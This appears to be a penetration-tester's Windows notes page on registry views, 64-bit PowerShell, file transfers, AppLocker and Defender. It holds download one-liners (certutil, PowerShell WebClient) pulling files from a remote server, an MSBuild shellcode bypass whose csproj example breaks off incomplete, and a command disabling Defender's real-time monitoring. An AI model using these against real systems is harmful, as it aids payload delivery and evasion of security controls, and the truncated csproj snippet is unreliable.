## Windows Registry

> The registry in 64-bit versions of Windows is divided into 32-bit and 64-bit keys. Many of the 32-bit keys have the same names as their 64-bit counterparts, and vice versa.

From [How to view the system registry by using 64-bit versions of Windows](https://support.microsoft.com/en-gb/help/305097/how-to-view-the-system-registry-by-using-64-bit-versions-of-windows).

If operating in a 32-bit process under a 64-bit system you will only be able to view the 32-bit registry.  For this reason, ensure all enumeration of the registry ocurrs from a 64-bit process.

## Process Migration

There can be a number of valid reasons to migrate processes, notably from 32-bit to 64-bit.  The reason is that certain exploits can only be executed from a 64-bit process, or there can be a want to view the 64-bit registry.

#### Launch x64 Powershell

```bash
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## File Transfers

### powershell

```text
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
```

### certutil

```bash
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
```

## Applocker

> AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.

Source: [What Is AppLocker?](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)

Despite the power this gives the Administrator in locking down what users can and can't execute, there are a disturbing number of ways to bypass this.  [Ultimate Applocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList) aims to record most of them.

[GreatSCT ](https://github.com/GreatSCT/GreatSCT)can also be used to generate payloads to bypass these.

### MSBuild

We can use MSBuild to execute arbitrary shellcode. The Cn33liz [MSBuildShell ](https://github.com/Cn33liz/MSBuildShell)is one such example. To compile a `csproj` file we use:

```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe test.csproj
```

An example csproj file to include shellcode within is:

```markup
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->

## Windows Defender

Defender can be quite annoying when dealing with attacking remote windows systems.  Fortunately it's not too difficult to evade but it's always good to be aware of how to deal with it.  We can set a lot of the Windows Defender parameters with [Set-MpPreference](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps).  To disable it use`Set-MpPreference -DisableRealtimeMonitoring $true`.  It's recommended to re-enable it after you're done.

### Attack Surface Reduction

â€‹[https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction)

## Alternate Data Streams

This is more a  feature of the NTFS file system than it is a Windows feature, but it's important to understand from both a red-team and blue-team perspective.  

These are also disturbingly common in CTF's through the security via obscurity, so we need some method of viewing and potentially executing these alternate data streams.  To list all alternate data streams 

```text
dir /R
```

### Powershell

```bash
Get-Content -path C:\Users\Booj\ads -stream *
```

We can also view individual streams using

```text
Get-Content -path C:\Users\Booj\ads -stream <streamname>
```

### Windows Pre-Vista

In Windows prior to Vista, there's unfortunately no easy way of viewing these streams in default Windows without a GUI access.  In an engagement this may not be entirely practical.

The best version, working on XP, I found to be [LADS](https://www.aldeid.com/wiki/LADS), but a number of the links online appear to be dead.  The [Web Archive](http://web.archive.org/web/20150602054446/http://www.heysoft.de/download/lads.zip) version is still up so acquiring a copy is still possible.
